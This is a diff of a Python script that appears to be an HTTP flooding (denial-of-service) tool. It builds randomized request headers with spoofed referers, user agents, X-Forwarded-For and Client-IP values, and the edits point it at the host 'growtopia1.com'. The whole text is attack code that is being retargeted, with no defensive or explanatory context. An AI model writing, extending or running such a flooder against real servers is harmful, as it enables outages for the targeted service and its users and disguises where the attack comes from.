@@ -53,9 +53,9 @@ def spoofer():
 def Headers(method):
     header = ""
     if method == "get" or method == "head":
-        connection = "Connection: Keep-Alive\r\n"
+        connection = "Host: growtopia1.com\r\nConnection: close\r\n"
         accept = random.choice(acceptall) + "\r\n"
-        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
+        content = "Content-Type: application/x-www-form-urlencoded\r\n charset=utf-8\r\n"
         referer = "Referer: " + random.choice(referers) + ip + "\r\n"
         connection += "Cache-Control: max-age=0\r\n"
         connection += "pragma: no-cache\r\n"
@@ -63,7 +63,7 @@ def Headers(method):
         randomip  = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
         forward = "X-Forwarded-For: 1\r\n"
         forward += "Client-IP: 10000\r\n"
-        length = "Content-Length: 100\r\nConnection: Keep-Alive\r\n"
+        length = "Content-Length: 100\r\nConnection: close\r\n"
         useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
         header = referer + forward + useragent + accept + content + connection +  length + "\r\n\r\n"
     return header
